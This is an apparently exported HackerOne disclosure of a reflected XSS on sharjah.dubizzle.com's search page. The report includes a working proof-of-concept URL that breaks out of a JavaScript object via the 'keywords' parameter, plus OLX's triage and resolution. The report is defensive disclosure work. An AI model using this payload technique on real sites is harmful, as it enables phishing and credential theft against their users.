{"id":363571,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjM1NzE=","url":"https://hackerone.com/reports/363571","title":"Search Page Reflected XSS on sharjah.dubizzle.com through unencoded output of GET parameter in JavaScript","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-06-08T20:16:29.471Z","submitted_at":"2018-06-08T20:16:29.471Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"pajoda","url":"/pajoda","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/270/820/e06d2eeae865f4d3429bffc91c531b07c36b9e15_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8146,"url":"https://hackerone.com/olx","handle":"olx","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/146/07ffc7e779ee301e61da60eda7f2bd862a7082ca_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/146/07ffc7e779ee301e61da60eda7f2bd862a7082ca_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"OLX","twitter_handle":"OLX","website":"http://olx.com","about":"OLX is an online classifieds platform that enables its users to create ads and display them on social networks."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-12-16T11:18:03.766Z","bug_reporter_agreed_on_going_public_at":"2018-11-16T11:17:59.648Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nI found a reflected XSS vulnerability on the search page of sharjah.dubizzle.com.\nBecause the GET parameter `keywords` is not being encoded before parsing it into the JavaScript, an attacker can break out of the code an execute JavaScript in the targets browser.\n\n### Vulnerable Code\n\nWhen searching for `testtestfirsthackeronereport` (https://sharjah.dubizzle.com/search/?keywords=testtestfirsthackeronereport\u0026is_basic_search_widget=1\u0026is_search=1), the source of the page will look like the following:\n\n```\nvar pageOptions = {\n\t\"query\": \"testtestfirsthackeronereport Sharjah\",\n\t\"pubId\": \"partner-dubizzle-search\",\n\t\"adPage\": \"1\",\n\t\"location\": false,\n\t\"hl\": \"en \",\n\t\"channel\": \"search\",\n\t\"number\": 4,\n\t\"sellerRatings\": false,\n\t\"linkTarget\": \"_blank\",\n        \n\t\"adsafe\": \"medium\"\n};\n```\n\nAltering the search term to `test\"` will result in the following output in the source of the page:\n\n```\nvar pageOptions = {\n\t\"query\": \"test\" Sharjah\",\n\t\"pubId\": \"partner-dubizzle-search\",\n\t\"adPage\": \"1\",\n\t\"location\": false,\n\t\"hl\": \"en \",\n\t\"channel\": \"search\",\n\t\"number\": 4,\n\t\"sellerRatings\": false,\n\t\"linkTarget\": \"_blank\",\n        \n\t\"adsafe\": \"medium\"\n};\n```\n\nI decided to close the variable definiton, execute my code, and readd the exact same code, which has been executed before, again after running my code, so there won't be any JavaScript errors and the payload will be executed.\n\n### PoC\n\nThe final payload is: `fghgfhgfh\"}%3Balert('XSS Paul Dannewitz '%2Bdocument.domain)%3B var pageOptions %3D {\"query\"%3A \"`\nURL: https://sharjah.dubizzle.com/search/?keywords=fghgfhgfh\"}%3Balert('XSS%20Paul%20Dannewitz%20'%2Bdocument.domain)%3B%20var%20pageOptions%20%3D%20{\"query\"%3A%20\"\u0026is_basic_search_widget=1\u0026is_search=1\n\n{F306774}\n\nThe PoC will be parsed to:\n\n```\nvar pageOptions = {\n\t\"query\": \"fghgfhgfh\"};alert('XSS Paul Dannewitz'+document.domain); var pageOptions = {\"query\": \" Sharjah\",\n\t\"pubId\": \"partner-dubizzle-search\",\n\t\"adPage\": \"1\",\n\t\"location\": false,\n\t\"hl\": \"en \",\n\t\"channel\": \"search\",\n\t\"number\": 4,\n\t\"sellerRatings\": false,\n\t\"linkTarget\": \"_blank\",\n        \n\t\"adsafe\": \"medium\"\n};\n```\n\n## Impact\n\nThe most simple thing an attacker could do is sending a malicious link to a dubizzle user, whichs redirects the user/victim to the attackers page - which is a dubizzle phishing site - via JavaScript and steal the login credentials. There are probably more creative ways of using the ability to run JavaScript in the victims browser on dubizzle.","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":306774,"file_name":"1.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/306/774/9ad62a70c800b98a29023177d773e49f11615e0a/1.PNG?response-content-disposition=attachment%3B%20filename%3D%221.PNG%22%3B%20filename%2A%3DUTF-8%27%271.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTQR22CE2%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T145113Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIHylhpFJOF4pRe7XlaDX6z3BLEup%2BswnNkaACr%2Fwjwr8AiASjuyeD0TYwrZA5sOldf5eC6UQrO8hSHC9jNR%2BVNumhyqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMfK%2BofD1wJOHYcOUJKtcDnC3f8Y3jglGs7z8YlxF9bdYkYlsSrPxEkx9hDqtH%2BQ3u1daZrwyM6F3WHlk0a%2BWNezGk%2FnRxFWuvgXlXXAEBaCUWEe1UXv97gs6KKr%2F4fZ92%2FH3VXeVMioYLi220Z8qDdmiwSK2Z%2FPfK0nlRhO3v9Ee3r3C7BMq5B4DRnfxp0cJyzU%2FHbMNzQNjyO%2BlGzreHCzcyKBe%2FoFAr2W6xbLokCINrIUxMnvI9Mxs7SraD%2FF2sZw8Ln4uZ6aJweQoOPwsnYKkrRjb370Lt%2FREkrEj9pcgae0C9R5BTZegZaqNN6CzMkZfNHB7RmNrhJFg6j7%2BfPYLcWFNxzvJV9dbVJdocqrM5Jmi3hE47KOBrMSGuFrCha2vRk9P64hqfhM1GdDtMLFZZn5VqOJgdyVWZ8bTrZpmlBP%2FJ6YiHIaMTH8G%2FRndaRrVRAR8iOSqWok%2FikWajxMvcVA29H%2F5RznwCFPkLrSbv34tOiWcwVp50Yy3HjkGq4LnY67LMRRRIwThQ9vc%2BM3G9xlb7TwO6%2F3vE5U6azDCH6hDFQ3Xi8ZJVYrTOOWINnf%2BC3BIhvL8Uql%2FhI1vUmbQiAR01xN%2FdEQ9ReTSo0pfJ3SDSXhBXiwUW0IRKspJO189rJyI3MImNkYsGOqYBwdOGh60JXyl1FPj8jwEbnfg6var6H0hyaUwn%2B%2FnamMWODqDwoSJI6f0Q6RJHnQJo2gfc6OFgj1W2B%2FGcJDL4gMvwPBD8bBDDMSaZ3x1nqw%2FhzMwsaQP%2BTnUJEKAVQSe3o5Yvwzg%2FSvpNP%2By981FbIZs9aWoGNPHY48ZIUNdNLCWPS2PxNm9xHrAxEcqn8ib1XLvQQS%2FALl2CG36%2BewUP2tPIf%2BIPmw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=991dabd306b385bfe53b8473e7252ebf520b81cf6d7f1e26fc5adf7cd6a0722a","file_size":195917,"type":"image/png"}],"allow_singular_disclosure_at":"2018-12-16T11:17:59.760Z","allow_singular_disclosure_after":-89004794.08985052,"singular_disclosure_allowed":true,"vote_count":18,"voters":["sameerphad72","th0roid","an0nym0us","khizer47","cryptographer","abartan","1a2er3d","0619","ronb1996","theshankaracharya","and 8 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":2860087,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Clicking on the link directly does not seem to work anymore, sorry for this. I double checked clicking on it in the preview. Especially the `+` and `;` characters need to be url encoded, which is why clicking on it does not work above.\n\nHere is a plain version, which should work perfectly fine:\n```\nhttps://sharjah.dubizzle.com/search/?keywords=fghgfhgfh%22}%3Balert(%27XSS%20Paul%20Dannewitz%20%27%2Bdocument.domain)%3B%20var%20pageOptions%20=%20{%22query%22:%20%22\u0026is_basic_search_widget=1\u0026is_search=1\n```","automated_response":false,"created_at":"2018-06-08T21:32:50.189Z","updated_at":"2018-06-08T21:32:50.189Z","actor":{"username":"pajoda","cleared":false,"url":"/pajoda","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/270/820/e06d2eeae865f4d3429bffc91c531b07c36b9e15_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2888686,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi,\n\nWe are deeply grateful for the security issue you shared with us. OLX's staff will we working on this issue to solve it ASAP.\n\nSince we just launched our vulnerability disclosure program, we are currently not awarding bounties or cash rewards for reported vulnerabilities but hope to do so in the near future.\n\nWe would like to add you in our Security Hall of Fame site that is hosted in security.olx.com. Could you please provide a profile you would like to link to (social media, HackerOne, etc) in our Hall of Fame entry?\n\nBest regards,\n\nGlobal Security Infrastructure Team","automated_response":false,"created_at":"2018-06-15T09:45:51.468Z","updated_at":"2018-06-15T09:45:51.468Z","actor":{"username":"bartosz_naumowicz","cleared":false,"url":"/bartosz_naumowicz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2889109,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Bartosz,\n\nthanks for your reply!\nSure thing - thanks, my Twitter profile is: https://twitter.com/padannewitz\n\nA quick note: I knew that this program does not provide bounties, but you might want to update your first response you are using for about two years. It looks a bit odd from the outside when you say that you just launched the program for two years.","automated_response":false,"created_at":"2018-06-15T12:07:21.301Z","updated_at":"2018-06-15T12:07:21.301Z","actor":{"username":"pajoda","cleared":false,"url":"/pajoda","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/270/820/e06d2eeae865f4d3429bffc91c531b07c36b9e15_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2958461,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Added :) \n\nGood point with this response. I will discuss it in our team. \nThanks!!\n\n\nRegards,\nGlobal Security Infra Team","automated_response":false,"created_at":"2018-06-29T10:53:03.790Z","updated_at":"2018-06-29T10:53:03.790Z","actor":{"username":"bartosz_naumowicz","cleared":false,"url":"/bartosz_naumowicz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3657358,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"The issue has already been fixed.\n\nThanks again for the report.\n\nBest regards,\nGlobal Security Team ","automated_response":false,"created_at":"2018-11-16T10:25:33.156Z","updated_at":"2018-11-16T10:25:33.156Z","actor":{"username":"bartosz_naumowicz","cleared":false,"url":"/bartosz_naumowicz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"pajoda","url":"/pajoda"},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3657471,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2018-11-16T11:17:59.674Z","updated_at":"2018-11-16T11:17:59.674Z","first_to_agree":true,"actor":{"username":"pajoda","cleared":false,"url":"/pajoda","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/270/820/e06d2eeae865f4d3429bffc91c531b07c36b9e15_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3834364,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2018-12-16T11:18:03.786Z","updated_at":"2018-12-16T11:18:03.786Z","actor":{"url":"/olx","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/146/07ffc7e779ee301e61da60eda7f2bd862a7082ca_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"OLX"}},"genius_execution_id":null,"team_handle":"olx","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}